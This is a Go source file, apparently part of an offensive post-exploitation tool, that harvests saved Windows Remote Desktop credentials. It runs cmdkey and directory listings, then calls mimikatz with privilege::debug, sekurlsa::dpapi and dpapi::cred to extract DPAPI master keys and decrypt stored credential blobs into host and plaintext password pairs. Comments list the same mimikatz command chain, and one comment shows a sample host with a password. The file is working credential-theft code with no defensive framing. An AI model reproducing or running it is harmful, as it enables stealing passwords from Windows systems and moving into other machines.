package src

import (
	"bytes"
	"fmt"
	"os/exec"
	"regexp"
	"strings"
)

// cmdkey -list | findstr "Domain:target"
// dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
// mimikatz "privilege::debug" "dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\{Credentials}" exit | findstr "guidMasterKey"
// mimikatz "privilege::debug" "sekurlsa::dpapi" exit | findstr "GUID MasterKey"
// mimikatz "privilege::debug" "dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\{Credentials} /masterkey:{masterkey}" exit | findstr "TargetName UserName CredentialBlob"

func checkTarget() bool{
	var outInfo bytes.Buffer
	cmd := exec.Command("cmd.exe", "/c","cmdkey","-list","|","findstr","Domain:target")
	cmd.Stdout = &outInfo
	cmd.Run()
	if outInfo.String()!=""{
		//fmt.Println("checkTarget:",outInfo.String())
		return true
	}
	return false
}

func getCred() [][]string{
	var outInfo bytes.Buffer
	cmd := exec.Command("cmd.exe", "/c","dir","/a","%userprofile%\\AppData\\Local\\Microsoft\\Credentials\\*")
	cmd.Stdout = &outInfo
	cmd.Run()
	if outInfo.String()!=""{
		//fmt.Println("getCred:",outInfo.String())
		reg := regexp.MustCompile(`([A-Z0-9]{32})`)
		result := reg.FindAllStringSubmatch(outInfo.String(),-1)
		if len(result)>0{
			return result
		}
	}
	return [][]string{}
}

func getGuidMasterKey(mimi string,Credential string) string{
	//guidMasterKey      : {xx}
	var outInfo bytes.Buffer
	cmd := exec.Command("cmd.exe", "/c",mimi,"privilege::debug","dpapi::cred /in:%userprofile%\\AppData\\Local\\Microsoft\\Credentials\\"+Credential,"exit","|","findstr","guidMasterKey")
	cmd.Stdout = &outInfo
	cmd.Run()
	//fmt.Println("getGuidMasterKey:",mimi,":",outInfo.String())
	if outInfo.String()!=""{
		reg := regexp.MustCompile(`guidMasterKey[\s]+:[\s]+\{(.*)\}`)
		result := reg.FindAllStringSubmatch(outInfo.String(),-1)
		if len(result)>0{
			return result[0][1]
		}
	}
	return ""
}

func getMasterKey(mimi string,guidMastKey string) string{
	var outInfo bytes.Buffer
	cmd := exec.Command("cmd.exe", "/c",mimi,"privilege::debug","sekurlsa::dpapi","exit","|","findstr","GUID MasterKey")
	cmd.Stdout = &outInfo
	cmd.Run()
	//fmt.Println("getMasterKey:",mimi,":",outInfo.String())
	if outInfo.String()!=""{
		reg1 := regexp.MustCompile(`GUID[\s]+:[\s]+\{(.*)\}`)
		result1 := reg1.FindAllStringSubmatch(outInfo.String(),-1)
		if len(result1)>0{
			for k, v := range(result1){
				if v[1] == guidMastKey{
					reg2 := regexp.MustCompile(`MasterKey[\s]+:[\s]+([a-z0-9]{128})`)
					result2 := reg2.FindAllStringSubmatch(outInfo.String(),-1)
					if len(result2)!=0{
						return result2[k][1]
					}
				}
			}
		}
	}
	return ""
}

func getPwd(mimi, cred, mastKey string) (host ,pwd string){
//TargetName     : Domain:target=TERMSRV/192.168.43.192
//CredentialBlob : 1qaz2wsx3edc
	var outInfo bytes.Buffer
	cmd := exec.Command("cmd.exe", "/c",mimi,"privilege::debug","dpapi::cred /in:%userprofile%\\AppData\\Local\\Microsoft\\Credentials\\"+cred+" /masterkey:"+mastKey,"exit","|","findstr","TargetName CredentialBlob")
	cmd.Stdout = &outInfo
	cmd.Run()
	//fmt.Println("getPwd:",mimi,outInfo.String(),"\n")
	if outInfo.String()!=""{
		reg1 := regexp.MustCompile(`Domain:target=TERMSRV/(.*)`)
		host1 := reg1.FindAllStringSubmatch(outInfo.String(),-1)
		reg2 := regexp.MustCompile(`CredentialBlob[\s]+:[\s]+(.*)`)
		pwd := reg2.FindAllStringSubmatch(outInfo.String(),-1)
		if len(host1) > 0 && len(pwd)>0{
			//fmt.Println("host:",host1[0][1])
			//fmt.Println("pwd:",pwd[0][1])
			return host1[0][1],pwd[0][1]
		}
	}
	return "",""
}

func (pass *PassInfos)run(mimi string){
	if mimi != ""{
		if checkTarget(){
			for _, v := range(getCred()){
				if v[1] != "DFBE70A7E5CC19A398EBF1B96859CE5D"{
					if guidMastKey := getGuidMasterKey(mimi,v[1]); guidMastKey!="" {
						if mastKey := getMasterKey(mimi,guidMastKey); mastKey!="" {
							if host, pwd := getPwd(mimi,v[1],mastKey); host!=""{
								pass.passInfos = append(pass.passInfos,PassInfo{strings.TrimSpace(host),strings.TrimSpace(pwd)})
							}
						}
					}
				}
			}
		} else {
			fmt.Println("没有检测到凭证!No voucher detected!")
		}
	} else {
		fmt.Println("没有指定mimikatz路径!No mimikatz path!")
	}
}

func (pass *PassInfos)output(){
	if len(pass.passInfos) >0 {
		for _, v := range(pass.passInfos){
			fmt.Println(fmt.Sprintf("host:%v,pass:%v",v.host,v.pass))
		}
	}
}

func (pass *PassInfos)checkData(info2 *rInfos){
	if len(pass.passInfos) >0 {
		for _, v := range(pass.passInfos){
			index := findHost(v.host,info2.rInfo)
			if index == -1 {
				info2.rInfo = append(info2.rInfo,rInfo{v.host, "","",v.pass})
			} else {
				info2.rInfo[index].pass = v.pass
			}
		}
	}
	//fmt.Println(pass.passInfos,":",info2)
}